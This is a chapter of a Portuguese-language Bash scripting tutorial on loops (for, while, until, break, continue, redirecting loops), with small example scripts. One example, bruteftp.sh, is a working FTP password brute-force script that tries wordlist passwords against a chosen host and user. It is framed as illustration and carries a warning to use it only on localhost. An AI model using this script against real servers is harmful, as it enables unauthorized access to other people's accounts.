5. Comandos de Loop
   ****************

   Isto é para quando você precisa repetir determinado comando, várias
vezes.



5.1. for
     ===

   O for funciona da seguinte forma:

   for variavel-indice in lista-de-argumentos; do
         <comandos que serão executados até que variavel-indice assuma
         todos os valores da lista-de-argumentos>
   done

   A princípio você pode se sentir um pouco confuso com esse negócio de
"lista-de-argumentos", assim como eu também fiquei, mas até que é fácil
de entender. Funciona da seguinte forma: a variável usada como índice
recebe todos os valores usados na lista de argumentos só que um de cada
vez, quando não tiver mais argumentos o for acaba.
   Vamos a um exemplo pra você entender direito:

/* ----------------- */
<++> BashScript/forsample1.sh
#!/bin/bash

# Exemplo (sem muita utilidade) do uso do comando "for"

echo "Mostra o caminho inteiro de alguns comandos"
for VAR in ls bc grep sed awk; do
        which $VAR
done
<-->
/* ----------------- */

   Pois é! É meio esquisito, eu concordo! Mas é o que nós temos. :)
Porém é raro a gente usar esta lista de argumentos deste jeito, passando
todos os parâmetros "na mão". Uma maneira mais prática é assim:

/* ----------------- */
<++> BashScript/forsample2.sh
#!/bin/bash

if [ $# -lt 1 ]; then
        echo "Uso: `basename $0` comando1 [comando2 [comandoN...]]" 1>&2
        exit 1
fi

for VAR in $@; do
        which $VAR
done
<-->
/* ----------------- */


   No exemplo acima, nós usamos no for os parâmetros passados na linha de
comando. Existe uma outra maneira que poderíamos ter usado para o mesmo
objetivo. Para isto basta omitirmos o "in lista-de-argumentos". Veja este
exemplo:

/* ----------------- */
<++> BashScript/minuscula.sh
#!/bin/bash
# renomeia arquivos que tenham nome em maiusculas para
# o equivalente em minusculas

[ $# -lt 1 ] && {
    echo "*** Erro: você precisa passar os arquivos que quer renomear"
    echo "Uso: Mminusculas arquivo1 [arquivoN]"
    exit
}

# repare que o for a seguir nao tem o "in lista-de-argumentos"!
for maiuscula
do
    [ -e "$maiuscula" ] || {
	echo "$maiuscula não existe, continuando com o próximo arquivo"
	continue
    }
    minuscula=$( echo $maiuscula | tr A-Z a-z )
    mv $maiuscula $minuscula
done
<-->
/* ----------------- */


   Agora para usarmos um for um pouco parecido com o das linguagens de
programação convencionais usamos um comandinho chamado "seq". Ele
funciona basicamente da seguinte forma:

/* -=-=-=-=-= exemplo =-=-=-=-=- */
$ seq 1 10
1
2
3
4
5
6
7
8
9
10

	# pode ser em ordem decrescente também:

$ seq 10 1
10
9
8
7
6
5
4
3
2
1
/* -=-=-=-=-= exemplo =-=-=-=-=- */

   Fácil não? Agora vejamos um exemplo:

/* ----------------- */
<++> BashScript/tabuada.sh
#!/bin/bash

if [ $# -ne 1 ]; then
    echo "Uso: `basename $0` n"
    echo "Onde 'n' é um número inteiro qualquer"
    exit 1
fi

for OP in `seq 1 10`; do
  echo -e "$1 + $OP = $[ $1 + $OP ] \t $1 - $OP = $[ $1 - $OP ]"
done

echo

for OP in `seq 1 10`; do
  echo -e "$1 * $OP = $[ $1 * $OP ] \t \
$1 / $OP = `echo "scale=2;$1 / $OP" | bc`"
done
<-->
/* ----------------- */

   Moleza! ;)


5.1.1 "for" como na linguagem C
      -------------------------

   Se você já é programador C, pode tirar proveito da sintaxe do let (já
explicado no ponto 4.1.2.). Para conferir isto basta pegar o script acima
(tabuada.sh) e trocar as linhas onde tem

for OP in `seq 1 10`; do

por esta linha:

for (( OP=1; OP <= 10; OP++ )); do

Só não pode esquecer dos ((dois parênteses)).



5.2. while
     =====

   Estrutura básica do while:

   while <expressão>; do
      <comandos que serão executados enquanto <expressão> retornar
       verdadeiro>
   done

   Sem muita conversa. Vamos direto a um exemplo:

/* ----------------- */
<++> BashScript/whilesample.sh
#!/bin/bash
# Script que soma os números positivos que são dados e sai do programa
# quando é entrado -1.

RESULT=0
NUM=0
echo -e "\e[1mPara sair entre com '-1'.\e[m"
while [ $NUM -ne -1 ]; do
    echo -n "Número: "
    read NUM
    if [ $NUM -gt 0 ]; then
        let RESULT+=$NUM
        # para quem não conhece C: VAR1+=VAR2 é a mesma coisa que fazer
        #                          VAR1=$[ $VAR1 + $VAR2 ]
    fi
done
echo "Soma dos positivos: $RESULT"
exit 0
<-->
/* ----------------- */



5.3. until
     =====

   É igual ao while, exceto por um detalhezinho. Veja a expressão básica
e saberá:

   until <expressão>; do
      <comandos que serão executados enquanto <expressão> retornar FALSO>
   done

   Leia direitinho: comandos que serão executados enquanto <expressão>
retornar FALSO! ;-)

   Exemplo:

/* ----------------- */
<++> BashScript/untilsample.sh
#!/bin/bash

CONT=10
until [ $CONT -eq 0 ]; do
        echo -ne "$CONT\t"
        let CONT--
done
echo
<-->
/* ----------------- */



5.4. break e continue
     ================

   Estes comandos são úteis quando usamos loops.


--> break

   Quebra a execução do loop. Para entender nada melhor que um exemplo:

/* ----------------- */
<++> BashScript/breaksample.sh
#!/bin/bash

# `true` sempre retorna verdadeiro
while true; do
	read -p "Tente adivinhar o número: " NUM
	[ "$NUM" -eq 666 ] && break
done

echo -e "\nVocê acertou! \n"
<-->
/* ----------------- */

   O que o break faz é pular a sequência de execução do script para o
que vier depois do "done". Ele também aceita argumento, da seguinte
forma: "break n", onde 'n' é um número inteiro que indica quantos
"done's" pular.


--> continue

   O continue interrompe o loop e faz novamente o teste do comando que
está controlando o loop (for, while, etc.). Veja este exemplo:

/* ----------------- */
<++> BashScript/concatenar.sh
#!/bin/bash

[ $1 ] || { echo "Entre com o(s) nome(s) do arquivo(s)"; exit 1; }

for FILE in $@; do
        [ -f $FILE ] || {
                echo -e "\"$FILE\" não é um arquivo\n"
                continue
        }

        cat $FILE >> AllFiles.txt
        echo -e "\n\n\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n\n\n" >> AllFiles.txt

done

echo "Feito!"
<-->
/* ----------------- */

   O que o continue faz é voltar lá para antes do "do" pra fazer o teste
novamente. Ele também aceita argumento no estilo "continue n" para
indicar quantos "do's" voltar.



5.5 Redirecionando loops
    ====================

   Lendo o livro "Linux: Programação Shell" (ver Referências) eu aprendi
umas formas de usar redirecionamento para loops. Vou tentar passar os
esquemas aqui através de exemplos meramente ilustrativos. Vamos a eles,
lembrando daqueles conceitos passados no tópico 3. (principalmente sobre
o read e sobre os redirecionamentos).


--> "pipeando" para o while

   Vamos imaginar um arquivo onde eu tenho os nomes de alguns amigos meus
e a região onde eles moram. Como alguns amigos moram em uma mesma região
eu não vou ficar repetindo a região para cada um. Portanto o arquivo fica
assim:

<++> BashScript/amigos.regiao
#############################
# lista de amigos e estados #
#############################
#
# OBS.: ISSO NÃO É UM SCRIPT!
#
# Linhas que COMEÇAM com '#' serão consideradas
# comentários pelo script "listamigos.sh".
#
# Use da seguinte forma:
# REGIAO        amigo1 amigo2 amigo3 amigoN ...
#

Nordeste        slater nashleon xf eSc2
Sudeste         module hekodangews manalaura blindbard klogd
Sul             evillord emmanuele

<-->


   Agora veja o script que usará as informações contidas no arquivo
"amigos.regiao":

/* ----------------- */
<++> BashScript/listamigos.sh
#!/bin/bash

# o egrep abaixo vai pegar o arquivo "amigos.regiao"
# sem exibir as linhas que comecem com um caractere '#'
# (considerado comentário) e sem mostrar linhas vazias,
# em seguida vai redirecionar a saída para a entrada do
# read que está lá no while (relembre-se do read no
# tópico 3.2.)
egrep -v "^#|^ *$" amigos.regiao |
while read REGIAO NOMES ; do
	echo -e "\e[1m--> Amigos do $REGIAO:\e[m"
	for amigo in $NOMES ; do
		echo "$amigo"
	done
	echo
done
<-->
/* ----------------- */

   Deu pra sacar direitinho? Qualquer dúvida é só dar uma olhada nas man
pages dos comandos que estão gerando as dúvidas.

   Mas a coisa não é tão simples assim... Se dentro do loop você quisesse
usar o comando read para ler do teclado, seria necessário pegar a entrada
de "/dev/tty". Sabendo que o /dev/tty é o terminal que você está usando.
   Se você tiver muitos amigos no arquivo "amigos.regiao" não vai
conseguir ver todos, pois a lista não caberá numa tela só. Neste caso, o
script a seguir será melhor que o "listamigos.sh".

/* ----------------- */
<++> BashScript/listamigos2.sh
#!/bin/bash

egrep -v "^#|^ *$" amigos.regiao |
while read REGIAO NOMES ; do
	echo -e "\n\e[32;1m--> Amigos do $REGIAO:\e[m"
	for amigo in $NOMES ; do
		echo -e "\e[1m$amigo\e[m"
	done
	echo -ne "\nEntre <ENTER> para continuar ou 'sair' para sair: "
	read QUIT < /dev/tty
	[ "$QUIT" = "sair" ] && exit
done
<-->
/* ----------------- */

   Se quiser comprovar com seus próprios olhos a necessidade de pegar a
entrada de "/dev/tty" é só retirar o "< /dev/tty" naquele read dentro do
loop.
   OBS.: Curiosamente o exit dentro de um loop que recebe dados de um
pipe funciona como se fosse um break. Pra comprovar isso coloque no final
do script listamigos2.sh um "echo bla bla bla" e quando o script mostrar
"Entre <ENTER> para continuar ou 'sair' para sair: " entre com 'sair'.
   Isso ocorre porque durante o "pipeamento" os comandos são executados
num subshell (um shell a parte ou shell filho, como preferir), e o exit
faz sair deste subshell.

   Vejamos um exemplo onde você verá que o exit funciona como o break:

/* ----------------- */
<++> BashScript/bruteftp.sh
#!/bin/bash
#
##################################################################
# ***********
# * ATENÇÃO *
# ***********
# Não use este script para atacar servidores remotos! Ele deixará
# arquivos de log imensos! Use-o apenas em localhost (127.0.0.1)
# e veja você mesmo os rastros deixados nos arquivos de log.
##################################################################
#
# Este código é só pra ilustração do texto
# "Programação em Bourne-Agai Shell", OK?
# Na prática mesmo ele não é muito útil.
# Se quiser fazer um ataque de força bruta
# mais eficiente faça em C.
# Veja mais sobre ataques de força bruta em um
# texto que o NashLeon fez em
# <http://unsekurity.virtualave.net>
#

# verifica se o parâmetro passado é um arquivo
[ -f "$1" ] || {
	echo -e "\e[1mErro na passagem de parâmetros\e[m"
	echo "Uso: `basename $0` wordlist"
	exit 1
}

WL="$1"

echo -e " \e[36;1m
------------------------------- \e[37;1m
 ataque de força bruta via ftp \e[36;1m
------------------------------- \e[m
"
read -p "Host: " HOST
read -p "Username: " USER

cat $WL |
while read PASS
do
    # 230 é o número que recebemos quando entramos com sucesso via ftp
    ftp -ivn << EoF | grep "^230" &>/dev/null
open $HOST
user $USER $PASS
bye
EoF

    # $? contém o código de retorno do grep
    [ $? -eq 0 ] && {
	echo -e "\n\e[36;5;1mO ataque foi bem sucedido! \e[m"
	echo -e "Username: \e[1m$USER\e[m\nPassword: \e[1m$PASS\e[m"
	exit 0
	# lembrando que o exit funciona como se fosse break
}

done

# $? contém o mesmo valor não-zero que fez parar o loop acima
[ $? -ne 0 ] && echo "
Você entupiu os arquivos de log por nada, pois o ataque fracassou...
Mais sorte da próxima vez!
"
<-->
/* ----------------- */

   O "pipeamento" para while também é usado no Mextract.sh.



--> redirecionando de arquivo para while

   Esse método é bem esquisitinho... Mas vou colocar ele aí para quem
quiser usar.

   Agora veremos um arquivo onde eu tenho os telefones de alguns amigos.
A disposição das informações dentro do arquivo é um pouco parecida com o
"amigos.regiao", veja:

<++> BashScript/agenda.tel
#######################
# Agenda de telefones #
#######################
#
# OBS. I: ISSO NÃO É UM SCRIPT!
# OBS. II: os números dos telefones deste
#          arquivo são fictícios, não adianta
#          que não vai dar pra sair passando
#          trote... :-)
#
# Linhas que COMEÇAM com '#' serão consideradas
# comentários pelo script "listartel.sh".
#
# Use da seguinte forma:
# NOME	PREFIXO	TELEFONE
# Com os campos separados por UM ÚNICO <TAB>.
#
# Exemplo:
# lampiao	12	12345678
# mariabonita	87	87654321

# telefone "dus manu"
xf	45	12431412
slater	98	65451654
minduin	45	54871800
nash	23	65576784
evil	23	54654654
heko	43	56465465
esc2	24	46456456

# telefone "das mina"
emmanuele	87	45646545
maylline	29	65654655
manalaura	82	65416578
erika	65	34245522
<-->


   Vamos ao script que se utilizará das informações de "agenda.tel":

/* ----------------- */
<++> BashScript/listartel.sh
#!/bin/bash
TempFile=/tmp/TEMP-$$

# o egrep abaixo vai mostrar o arquivo agenda.tel
# sem exibir as linhas que comecem com um caractere '#'
# (considerado comentário) e sem mostrar linhas vazias.
# redirecionando a saída para $TempFile
egrep -v "^#|^ *$" agenda.tel > $TempFile

while read NOME PRE TEL ; do
	echo -e "Tel de $NOME: ($PRE)$TEL"
done < $TempFile
# esse redirecionamento faz com o que o "read" lá no while
# leia linha por linha do arquivo $TempFile

rm $TempFile
<-->
/* ----------------- */


   Agora quando você se sentir solitário e quiser conversar com alguém,
basta fazer o seguinte:

$ ./listartel.sh | grep emma

   Aí é só você ligar pra emmanuele e bater um papo legal com ela. :)

   OBS. I: Neste esquema também é necessário pegar os dados de /dev/tty
se você quiser usar o read dentro do loop.
   OBS. II: Se você usar exit dentro do loop usando este esquema, ele
REALMENTE SAIRÁ DO SCRIPT. Não é igual ao esquema anterior onde o while
recebe dados de um pipe e o exit funciona como se fosse um break. Então
repetindo: neste esquema o exit funciona normalmente!



--> redirecionando a saída do loop para a tela

   Ficou confuso com este título? "Redirecionar a saída do loop para a
tela parece ser uma coisa inútil, pois isso acontece todas as vezes." Aí
que você se engana! Vamos ao exemplo onde eu mostrarei a utilidade de se
redirecionar desta maneira...

   Temos um script chamado retornatel.sh que pesquisa o telefone de um
determinado amigo (o nome é passado ao script durante sua execução). Agora
queremos pegar o telefone deste amigo e armazená-lo numa variável da
seguinte maneira:

FONE=`./retornatel.sh`

   Só que, como veremos no script a seguir, a saída do script não é
somente o número do telefone. Existe uma interface com o usuário
perguntando qual o nome a ser pesquisado. Veja o script:

/* ----------------- */
<++> BashScript/retornatel.sh
#!/bin/bash
# tá bom, tá bom... eu sei que não é um exemplo muito útil...
# é só pra ilustrar a utilidade de redirecionar a saída do loop

FILE=agenda.tel

function gotoxy {
	[ $# -ne 2 ] && {
		echo gotoxy: Erro na passagem de parâmetros
		echo Uso: gotoxy X Y
		exit 1
	}
	echo -ne "\e[$1;$2H"
}

while true; do
	clear
	gotoxy 5 1
	read -p "Nome a ser pesquisado ('sair' para sair): " NOME
	[ "X$NOME" = Xsair ] && exit
	if grep "$NOME" $FILE &>/dev/null ; then
		break
	else
		gotoxy 10 15
		echo Nenhum $NOME foi encontrado em $FILE.
		read -p "Pressione <ENTER> para continuar..."
	fi
done > /dev/tty

grep "^$NOME" $FILE | cut -f3

<-->
/* ----------------- */

   Olha o /dev/tty aí de novo! :P
   Redirecionando a saída de todo o loop para "/dev/tty", fará com que os
dados impressos para fazer a interface com o usuário não sejam enviados
para a saída padrão e por conseguinte não sejam enviados para a variável
que está recebendo o número através do método

variavel=`programa`

   Desta maneira, se você quer armazenar o telefone do xf na variável
XFTEL, faça o seguinte:

XFTEL=`./retornatel.sh`

E então pesquise por xf. Depois é só usar

echo $XFTEL

para ver o telefone do cara.

   Experimente usar o script sem este redirecionamento e pegar o telefone
do xf desta maneira que expliquei para apreciar os resultados bizarros...


